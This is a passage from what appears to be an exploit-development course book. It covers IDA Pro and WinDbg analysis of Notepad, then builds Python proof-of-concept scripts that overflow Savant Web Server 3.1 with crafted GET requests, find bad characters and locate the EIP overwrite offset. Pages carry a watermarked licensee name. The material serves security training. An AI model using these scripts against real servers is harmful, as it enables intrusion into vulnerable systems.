search for functions by name as shown in Figure 51. 
 
Figure 51: Search for functions using a filter 
In the same manner, we can search for global variables through the Jump by name… submenu. 
Executables and DLLs contain a lot of code and use imported functions. In the case of DLLs, they 
also export functions. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
150 
All the imported and exported functions are available from the Imports and Exports tabs 
respectively (Figure 52). As with the Function window, we can right-click and apply a name filter 
using the Quick filter option to narrow our search. 
 
Figure 52: Imports and Exports tabs 
While these simple techniques are useful, IDA Pro contains even more powerful search 
functionality. We can use cross referencing (xref)136 to detect all usages of a specific function or 
global variable in the entire executable or DLL. 
To obtain the list of cross references for a function name or global variable, we’ll select its name 
from the graph view with the mouse cursor and press the x key. Figure 53 shows an example of 
cross-referencing a global variable called SubKey. 
 
Figure 53: Performing xref in SubKey 
In this section, we’ve covered multiple ways to search for text, variables, and functions. These 
techniques can be very useful when performing the static portion of our analysis. 
5.1.4.1 Exercises 
1. 
Perform different searches using the explained methods. 
2. 
Locate the SubKey global variable and find where it is used. 
 
136 (Chris Eagle, 2011), https://www.hex-rays.com/products/ida/support/idadoc/607.shtml 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
151 
5.2 Working with IDA Pro 
Typically, we’ll use IDA Pro when dynamic analysis by itself is too difficult or when we want to 
conduct pure static analysis to avoid the potential risks of dynamic analysis, such as during 
malware reverse engineering. 
In this course, we’ll use both methods together to make our analysis easier. 
In the remaining sections of this module, we will examine how WinDbg and IDA Pro can 
supplement each other. 
5.2.1 Static-Dynamic Analysis Synchronization 
Let’s cover how to sync WinDbg and IDA Pro so they both show us the same code. 
One important way we can leverage IDA Pro is by using it as a “map” to guide our debugging 
session. However, to easily jump back and forth between the debugger and IDA Pro, we need to 
make sure that the base address of the target executable in IDA Pro coincides with that of the 
debugged process in WinDbg. 
When a Windows executable or DLL file is compiled and linked, the PE header137 ImageBase field 
defines the preferred base address when loaded into memory. Often this will not be the address 
used at runtime, due to other circumstances such as colliding modules or the Address Space 
Layout Randomization (ASLR)138 security mitigation. 
When the two base addresses do not coincide, the analyzed file can be rebased in IDA Pro to 
match the address used by the application at runtime. 
To experiment with the rebasing process, let’s log in to the Windows 10 client, open Notepad, and 
attach WinDbg to it. We’ll use the lm command to dump the base address of Notepad: 
0:006> lm m notepad 
Browse full module list 
start    end        module name 
00f20000 00f5f000   notepad    (pdb symbols)  ... 
Listing 158 - Listing base address of notepad module 
Now we switch back to IDA Pro and navigate to the Edit > Segments > Rebase program… 
submenu entry, which opens the dialog box given in Figure 54. 
 
137 (Microsoft, 2019), https://msdn.microsoft.com/en-us/library/windows/desktop/ms680547(v=vs.85).aspx 
138 (Wikipedia, 2020), https://en.wikipedia.org/wiki/Address_space_layout_randomization 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
152 
 
Figure 54: Rebase program 
After entering the new image base address in the highlighted field of the dialog box, IDA Pro starts 
the recalculation process. Once completed, all addresses, references, and global variables will 
match those found in WinDbg during the debugging session. 
If the application contains compiled debug information, rebasing it may 
sometimes break the symbols. 
By rebasing the executable in IDA Pro to the base address found in the debugger (0x00f20000), 
we can synchronize the static and dynamic analysis, which allows us to use absolute addresses. 
Once the session is synchronized, we can jump from an instruction in WinDbg to the same 
instruction in IDA Pro. 
Let’s imagine we had found the GotoDlgProc function from Notepad as part of our dynamic 
analysis, as shown in Listing 159. 
0:006> u notepad!GotoDlgProc 
notepad!GotoDlgProc: 
00f279e0 8bff            mov     edi,edi 
00f279e2 55              push    ebp 
00f279e3 8bec            mov     ebp,esp 
00f279e5 81ecd4000000    sub     esp,0D4h 
00f279eb a184d1f300      mov     eax,dword ptr [notepad!__security_cookie (00f3d184)] 
00f279f0 33c5            xor     eax,ebp 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
153 
00f279f2 8945fc          mov     dword ptr [ebp-4],eax 
00f279f5 8b450c          mov     eax,dword ptr [ebp+0Ch] 
Listing 159 - Listing GotoDlgProc in WinDbg 
In IDA Pro, we can press g to bring up the “Jump to address” dialog box and enter the absolute 
address of the function to end up at the same location: 
 
Figure 55: Displaying the same code segment in IDA Pro 
Using this technique helps us when debugging huge chunks of code, as it’s easy to get lost in 
WinDbg by accidentally stepping into a function call, and then losing track of where the CPU is 
executing instructions. 
5.2.1.1 Exercises 
1. 
Start Notepad and attach WinDbg to it. 
2. 
Rebase Notepad in IDA Pro to the same base address and compare them. 
5.2.2 Tracing Notepad 
Now that we have covered the features of IDA Pro required for this course, we need to start using 
them for our analysis. In this section, we are going to perform a simple analysis inside the 
Notepad application. 
Our analysis will consist of tracing the code flow when Notepad opens a file. To do this, we’ll 
create a text file with the content “Test”, as shown in Listing 160. 
C:\Tools>echo Test > C:\Tools\doc.txt 
Listing 160 - Create text file with echo 
Next, we’ll open Notepad and attach WinDbg to it. To perform any read or write actions on 
Windows, applications must obtain a handle to the file, commonly done with the CreateFileW 
function from kernel32.dll. 
Let’s set a breakpoint on the API with bp and attempt to open the file in Notepad. This causes our 
breakpoint to be triggered, as shown in Listing 161. 
0:006> bp kernel32!CreateFileW 
 
0:006> g 
... 
Breakpoint 0 hit 
eax=00000001 ebx=00bf7794 ecx=007febdc edx=77e71670 esi=00bf7794 edi=04b88178 
eip=75c2c260 esp=007febec ebp=007ff02c iopl=0         nv up ei pl zr na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200246 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
154 
KERNEL32!CreateFileW: 
75c2c260 ff25a043c875    jmp     dword ptr [KERNEL32!_imp__CreateFileW (75c843a0)] 
ds:0023:75c843a0={KERNELBASE!CreateFileW (753461a0)} 
Listing 161 - Breakpoint on CreateFileW 
To figure out where this function was called from within Notepad, we could turn to IDA Pro, locate 
CreateFileW in the Imports tab, and perform a cross reference. Sadly, this provides us with 20 
different possibilities. 
 
Figure 56: Cross references to CreateFileW 
Instead, we will let execution continue in the debugger until the end of CreateFileW with pt, and 
we will return into the calling function: 
0:000> pt 
eax=00000640 ebx=00bf7794 ecx=3b76cea0 edx=00000000 esi=00bf7794 edi=04b88178 
eip=75346201 esp=007febec ebp=007ff02c iopl=0         nv up ei pl zr na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200246 
KERNELBASE!CreateFileW+0x61: 
75346201 c21c00          ret     1Ch 
 
0:000> p 
eax=00000640 ebx=00bf7794 ecx=3b76cea0 edx=00000000 esi=00bf7794 edi=04b88178 
eip=00f25085 esp=007fec0c ebp=007ff02c iopl=0         nv up ei pl zr na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200246 
notepad!UpdateEncoding+0x5d: 
00f25085 8bd8            mov     ebx,eax 
Listing 162 - Execute to the end of CreateFileW and return 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
155 
We now have an address inside Notepad (highlighted in Listing 162) that we can use with IDA Pro. 
EAX also contains the handle to the file we’ll use later. 
After jumping to the address, we find a basic block that sets up arguments and calls CreateFileW, 
as displayed in Figure 57. 
 
Figure 57: Basic block that has the call to CreateFileW 
It is easier for us to understand what arguments are supplied to the API when displayed this way, 
since IDA Pro lists their names as comments. This is extremely useful while debugging and it 
works because IDA Pro understands how to match the arguments to the Windows API function 
prototype.139 
The process we followed in this example is common during a reverse engineering session as we 
often want to figure out what happens after an API call, or what chunk of code performed a 
specific function call. 
Let’s follow the execution flow in IDA Pro and attempt to locate a call to ReadFile140 within the 
same function that performed a call to CreateFileW. The basic block shown in Figure 58 seems to 
be the one we want: 
 
Figure 58: Call to ReadFile in a subsequent basic block 
 
139 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilew 
140 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-readfile 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
156 
 
From the highlighted portion of Figure 58, we notice that the content of EAX at address 0xF250A4 
is noted by IDA Pro as “lpBuffer”. According to the ReadFile documentation, this is a pointer to the 
memory buffer that receives the data read from a file. 
Let’s verify that this basic block is indeed the one used by Notepad to invoke ReadFile. We can do 
this by setting a breakpoint on the address 0xF250A6 and letting execution continue: 
0:000> bp f250a6 
 
0:000> g 
Breakpoint 1 hit 
eax=007fec28 ebx=00000640 ecx=3b76cea0 edx=00000000 esi=00bf7794 edi=04b88178 
eip=00f250a6 esp=007febf8 ebp=007ff02c iopl=0         nv up ei pl nz ac pe cy 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200217 
notepad!UpdateEncoding+0x7e: 
00f250a6 ff15c401f400    call    dword ptr [notepad!_imp__ReadFile (00f401c4)] 
ds:0023:00f401c4={KERNEL32!ReadFile (75c2c5e0)} 
 
0:000> dds esp L5 
007febf8  00000640 
007febfc  007fec28 
007fec00  00000400 
007fec04  007fec20 
007fec08  00000000 
Listing 163 - Continue execution to the call into ReadFile 
In Listing 163, we find that our breakpoint is triggered and the first argument, as highlighted, is the 
same file handle returned by CreateFileW earlier. 
To identify the file’s contents, we’ll note the highlighted address of the output buffer in the listing 
above and step over the call to ReadFile: 
0:000> p 
eax=00000001 ebx=00000640 ecx=3b092550 edx=77e71670 esi=00bf7794 edi=04b88178 
eip=00f250ac esp=007fec0c ebp=007ff02c iopl=0         nv up ei pl nz na po nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200202 
notepad!UpdateEncoding+0x84: 
00f250ac 85c0            test    eax,eax 
 
0:000> da 007fec28   
007fec28  "Test ..w." 
Listing 164 - Locating the file contents 
After performing the call to ReadFile, we notice that the output buffer (displayed with da) has been 
populated with the content we put in the text file. 
While not surprising, this simple example demonstrate how we can use IDA Pro and WinDbg to 
easily navigate the execution flow and make educated guesses about addresses that warrant our 
attention. 
5.2.2.1 Exercises 
1. 
Repeat the analysis shown in this section, making use of both WinDbg and IDA Pro. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
157 
2. 
Place a breakpoint on CreateFileW and save a file with Notepad. Attempt to locate where a 
subsequent call to WriteFile141 is performed by using IDA Pro and WinDbg together. 
5.3 Wrapping Up 
This module introduced us to the IDA Pro interface and features. We also covered how to use IDA 
Pro as a static analysis tool to support our dynamic analysis in WinDbg. 
Since we will often rely on these skills in subsequent modules, it is important to get comfortable 
practicing with IDA Pro. 
 
141 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-writefile 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
158 
 
6 Overcoming Space Restrictions: Egghunters 
In some cases, a vulnerability only provides us with a very small buffer that we can use after a 
memory corruption. In such cases, it can be difficult for the attacker to reliably position a larger 
payload at a predictable location in memory. 
Sometimes, depending on the vulnerability or application, it’s possible to store a larger payload 
somewhere else in the address space of the process. In a situation like this, the Egghunter 
technique may be an effective exploitation methodology. 
In this module, we will explore a vulnerability142 in the Savant143 Web Server version 3.1.144 We are 
going to deal with space restrictions, bad characters that impact the exploit development, and a 
partial instruction pointer overwrite. 
Overcoming these obstacles and understanding how an Egghunter works will help us develop a 
reliable and portable exploit. 
6.1 Crashing the Savant Web Server 
The vulnerable application is already installed on the dedicated Windows 10 client, so we can 
launch it either by using the icon pinned on the taskbar or by searching for “Savant Web Server” in 
the Start menu. This will open the application window and start the web server on port 80. 
 
Figure 59: Savant Web Server application Window 
According to the public CVE145 and proof of concept, sending a large HTTP GET request to the 
target triggers the vulnerability. Let’s review the proof of concept and attempt to crash the Savant 
Web Server. 
 
142 (Exploit-db, 2012), https://www.exploit-db.com/exploits/38079 
143 (Savant Web Server), http://savant.sourceforge.net 
144 (Exploit-db, 2012), https://www.exploit-db.com/exploits/18401 
145 (CVE Details), https://www.cvedetails.com/cve/CVE-2002-1120/ 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
159 
#!/usr/bin/python 
import socket 
import sys 
from struct import pack 
 
try: 
  server = sys.argv[1] 
  port = 80 
  size = 260 
 
  httpMethod = b"GET /" 
  inputBuffer = b"\x41" * size 
  httpEndRequest = b"\r\n\r\n" 
 
  buf = httpMethod + inputBuffer +  httpEndRequest 
 
  print("Sending evil buffer...") 
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
  s.connect((server, port)) 
  s.send(buf) 
  s.close() 
   
  print("Done!") 
   
except socket.error: 
  print("Could not connect!") 
Listing 165 - egghunter_0x01.py: Triggering the vulnerability 
In Listing 165, we set our buffer to the HTTP GET method followed by 260 0x41 (A in ASCII) bytes. 
The size of the buffer was taken from the public exploit. Finally, we end the request with the 
carriage return and two new lines. 
Before running our proof of concept, we need to make sure to attach WinDbg to the Savant.exe 
process. 
(1040.1b84): Access violation - code c0000005 (first chance) 
First chance exceptions are reported before any exception handling. 
This exception may be expected and handled. 
*** WARNING: Unable to verify checksum for C:\Savant\Savant.exe 
eax=ffffffff ebx=01805718 ecx=6f2d6175 edx=00000000 esi=01805718 edi=0041703c 
eip=41414141 esp=01b8ea2c ebp=41414141 iopl=0         nv up ei pl nz na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206 
41414141 ??              ??? 
Listing 166 - WinDbg catching the first access violation 
Once we run our proof of concept, WinDbg should catch an access violation as shown above in 
Listing 166. 
Good. It seems that by sending our proof of concept, we can gain control over the instruction 
pointer. Now let’s convert this initial proof of concept into a fully working exploit. 
6.1.1.1 Exercises 
1. 
Start the Savant Web Server application and attach WinDbg to the process. 
2. 
Run the first proof of concept and verify that you can overwrite the instruction pointer. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
160 
6.2 Analyzing the Crash in WinDbg 
At first glance, it would appear that we are dealing with a typical stack overflow where we have 
full control over the instruction pointer. However, after some analysis, we begin to notice some 
interesting peculiarities. 
In a vanilla stack overflow, such as the one covered in a previous module, the ESP register would 
point to our controlled buffer, which would store the shellcode. The buffer would then overwrite 
the instruction pointer with an assembly instruction, such as JMP ESP, that would redirect the 
execution flow to our shellcode. 
Inspecting the stack in WinDbg reveals that ESP points to our controlled buffer, but in this case 
we only have three bytes available for our shellcode. Because of this, we cannot place our 
shellcode as we would in a vanilla stack overflow. We will examine how to deal with this 
restriction later. 
0:004> dds @esp L5 
01b8ea2c  00414141 Savant+0x14141 
01b8ea30  01b8ea84 
01b8ea34  0041703c Savant+0x1703c 
01b8ea38  01805718 
01b8ea3c  01805718 
Listing 167 - Inspecting the stack after the crash 
Whenever we are dealing with a limited amount of space, we should first attempt to increase the 
size of the buffer we send to determine if this results in more space for our overflow. 
However, after attempting this, we determine that increasing the size of the buffer in our proof of 
concept by even one byte will cause a different crash where we do not gain control over the 
instruction pointer: 
(1670.1694): Access violation - code c0000005 (first chance) 
First chance exceptions are reported before any exception handling. 
This exception may be expected and handled. 
*** WARNING: Unable to verify checksum for C:\Savant\Savant.exe 
*** ERROR: Module load completed but symbols could not be loaded for 
C:\Savant\Savant.exe 
eax=41414141 ebx=016456d0 ecx=81914a60 edx=00000001 esi=016456d0 edi=0041703c 
eip=0040c05f esp=02fee6b8 ebp=02feea24 iopl=0         nv up ei pl zr na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246 
Savant+0xc05f: 
0040c05f 8b08            mov     ecx,dword ptr [eax]  ds:0023:41414141=???????? 
Listing 168 - Causing a different crash by increasing the size of the input buffer 
In addition to being limited in size, our buffer is null-byte terminated. This is most likely because it 
is being stored as a string. Let’s make a note of this, as it is something that we will abuse later on 
in the module. 
Continuing our crash analysis, let’s determine if any of the registers point to our buffer. This 
would allow us to overwrite EIP with an indirect JMP to the register and redirect execution to our 
buffer. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
161 
Unfortunately, none of the registers point to our buffer at the time of the overflow. As a last check, 
let’s inspect the stack to determine if it contains any pointers to our buffer. 
The second DWORD on the stack is interesting because it points to a memory location that is very 
close to our current stack pointer. Let’s inspect this memory address with WinDbg to determine if 
it points to any interesting data. 
0:004> dds @esp L2 
01b8ea2c  00414141 Savant+0x14141 
01b8ea30  01b8ea84 
 
0:004> dc poi(esp+4) 
01b8ea84  00544547 00000000 00000000 00000000  GET............. 
01b8ea94  00000000 00000000 4141412f 41414141  ......../AAAAAAA 
01b8eaa4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA 
01b8eab4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA 
01b8eac4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA 
01b8ead4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA 
01b8eae4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA 
01b8eaf4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA 
Listing 169 - Inspecting the memory address that points further down the stack 
According to the output from Listing 169, at the time of the crash, the second DWORD on the 
stack points to the HTTP method, followed by several null bytes and then our controlled buffer. 
Now that we have a good understanding of the limitations in our current case study in terms of 
available space as well as a pointer to our buffer, we can continue with the exploit development 
process. 
6.2.1.1 Exercises 
1. 
Verify the space limitation after triggering the access violation. 
2. 
Attempt to increase the buffer size and determine if the conditions of the crash change. 
3. 
Can you tell why it is important that our buffer is stored as a string in memory? 
4. 
Run the proof of concept multiple times and confirm that the second DWORD always points 
to the HTTP method as shown in this section. 
6.3 Detecting Bad Characters 
Apart from the space limitations, our next step is to determine the bad characters of our overflow. 
We will update our initial buffer to include all possible hex characters as shown below. 
... 
try: 
  server = sys.argv[1] 
  port = 80 
  size = 260 
 
  badchars = ( 
    b"\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c" 
    b"\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19" 
    b"\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26" 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
162 
    b"\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33" 
    b"\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40" 
    b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d" 
    b"\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a" 
    b"\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67" 
    b"\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74" 
    b"\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81" 
    b"\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e" 
    b"\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b" 
    b"\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8" 
    b"\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5" 
    b"\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2" 
    b"\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf" 
    b"\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc" 
    b"\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9" 
    b"\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6" 
    b"\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff") 
 
  httpMethod = b"GET /" 
  inputBuffer = badchars 
  inputBuffer+= b"\x41" * (size - len(inputBuffer)) 
  httpEndRequest = b"\r\n\r\n" 
... 
Listing 170 - egghunter_0x02.py: Detecting bad characters 
Running the proof of concept against the vulnerable software does not seem to cause a crash. 
This is most likely the result of a bad character. In order to identify which of the bad characters 
prevent Savant from crashing, we will modify our proof of concept and comment out the first half 
of the lines from the badchars variable. 
... 
try: 
  server = sys.argv[1] 
  port = 80 
  size = 260 
 
  badchars = ( 
    #b"\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c" 
    #b"\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19" 
    #b"\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26" 
    #b"\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33" 
    #b"\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40" 
    #b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d" 
    #b"\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a" 
    #b"\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67" 
    #b"\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74" 
    #b"\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81" 
    b"\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e" 
    b"\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b" 
    b"\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8" 
    b"\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5" 
    b"\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2" 
    b"\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf" 
    b"\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc" 
    b"\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9" 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
163 
    b"\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6" 
    b"\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff" 
    ) 
 
  httpMethod = b"GET /" 
  inputBuffer = badchars 
  inputBuffer+= b"\x41" * (size - len(inputBuffer)) 
  httpEndRequest = b"\r\n\r\n" 
... 
Listing 171 - egghunter_0x02.py: Commenting out lines in the badchars variable 
After running the updated proof of concept (Listing 171), we successfully overwrite the instruction 
pointer. This indicates that the problematic characters are not present within the last half of the 
badchars variable, which is not commented out. 
(1dac.1b98): Access violation - code c0000005 (first chance) 
First chance exceptions are reported before any exception handling. 
This exception may be expected and handled. 
*** WARNING: Unable to verify checksum for C:\Savant\Savant.exe 
eax=ffffffff ebx=019d57b0 ecx=b4797e20 edx=00000000 esi=019d57b0 edi=0041703c 
eip=41414141 esp=01bdea2c ebp=41414141 iopl=0         nv up ei pl nz na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206 
41414141 ??              ??? 
Listing 172 - Overwriting the instruction pointer after commenting out part of the badchars variable 
We can also confirm that none of our characters have been mangled in memory using WinDbg. 
0:005> db esp - 0n257 
01bde92b  82 83 84 85 86 87 88 89-8a 8b 8c 8d 8e 8f 90 91  ................ 
01bde93b  92 93 94 95 96 97 98 99-9a 9b 9c 9d 9e 9f a0 a1  ................ 
01bde94b  a2 a3 a4 a5 a6 a7 a8 a9-aa ab ac ad ae af b0 b1  ................ 
01bde95b  b2 b3 b4 b5 b6 b7 b8 b9-ba bb bc bd be bf c0 c1  ................ 
01bde96b  c2 c3 c4 c5 c6 c7 c8 c9-ca cb cc cd ce cf d0 d1  ................ 
01bde97b  d2 d3 d4 d5 d6 d7 d8 d9-da db dc dd de df e0 e1  ................ 
01bde98b  e2 e3 e4 e5 e6 e7 e8 e9-ea eb ec ed ee ef f0 f1  ................ 
01bde99b  f2 f3 f4 f5 f6 f7 f8 f9-fa fb fc fd fe ff 41 41  ..............AA 
Listing 173 - Verifying that the characters are not mangled in memory 
We’ll repeat this process by uncommenting one line at the time and inspecting the result after 
running our proof of concept against the vulnerable software with the debugger attached. 
If the application does not crash, or if we encounter a different crash which does not overwrite the 
instruction pointer, we can safely assume that the previously uncommented line contains bad 
characters. Once we identify the problematic line of characters, we can send each character from 
that line individually to the application until we identify the bad characters. 
Following this process of filtering out the bad characters, we determine that some, such as 0x0A, 
prevent the vulnerable application from crashing. We also found that other characters, such as 
0x0D, cause a completely different crash. 
The list of all bad characters is shown below. 
0x00, 0x0A, 0x0D, 0x25 
Listing 174 - List of bad characters 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
164 
With the list of bad characters and the crash analysis we did earlier, it’s time to move on. Next, 
we’ll gain control of the execution flow. 
6.3.1.1 Exercises 
1. 
Update your proof of concept to include all possible hex characters. 
2. 
Run the proof of concept multiple times until you determine all the bad characters. 
6.4 Gaining Code Execution 
Before dealing with the space limitations, let’s try to determine the exact offset to our instruction 
pointer overwrite. We will use msf-pattern_create for the unique string and then replace it in 
our current proof of concept. 
... 
try: 
  server = sys.argv[1] 
  port = 80 
 
  httpMethod = b"GET /" 
  inputBuffer = 
b"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7
Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af
6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4A
i5Ai" 
  httpEndRequest = b"\r\n\r\n" 
... 
Listing 175 - egghunter_0x03.py: Determining the offset of our overflow 
Running the proof of concept from Listing 175 sometimes causes a different access violation in 
which our instruction pointer is not overwritten with a unique value as expected. 
(b94.d94): Access violation - code c0000005 (first chance) 
First chance exceptions are reported before any exception handling. 
This exception may be expected and handled. 
*** WARNING: Unable to verify checksum for C:\Savant\Savant.exe 
eax=00694135 ebx=001a5778 ecx=0cfdd18b edx=00000001 esi=001a5778 edi=0041703c 
eip=0040c05f esp=03dfe6b8 ebp=03dfea24 iopl=0         nv up ei pl zr na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246 
Savant+0xc05f: 
0040c05f 8b08            mov     ecx,dword ptr [eax]  ds:0023:00694135=???????? 
Listing 176 - Triggering the overflow with the unique string 
Before attempting to troubleshoot the issue with the pattern, let’s quickly attempt to manually 
identify the offset by splitting our buffer: 
... 
try: 
  server = sys.argv[1] 
  port = 80 
 
  httpMethod = b"GET /" 
  inputBuffer = b"\x41" * 130 
  inputBuffer+= b"\x42" * 130 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
165 
  httpEndRequest = b"\r\n\r\n" 
... 
Listing 177 - egghunter_0x03_02.py: Manually determining the offset of our overflow 
We restart the vulnerable application, re-attach WinDbg to it and proceed to run our updated proof 
of concept. 
(1378.10b0): Access violation - code c0000005 (first chance) 
First chance exceptions are reported before any exception handling. 
This exception may be expected and handled. 
*** WARNING: Unable to verify checksum for C:\Savant\Savant.exe 
eax=ffffffff ebx=01925778 ecx=3373eeb6 edx=00000000 esi=01925778 edi=0041703c 
eip=42424242 esp=03efea2c ebp=42424242 iopl=0         nv up ei pl nz na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206 
42424242 ??              ??? 
Listing 178 - Manually identifying the offset for our overwrite 
The output in Listing 178 reveals that the instruction pointer is again under our control. It was also 
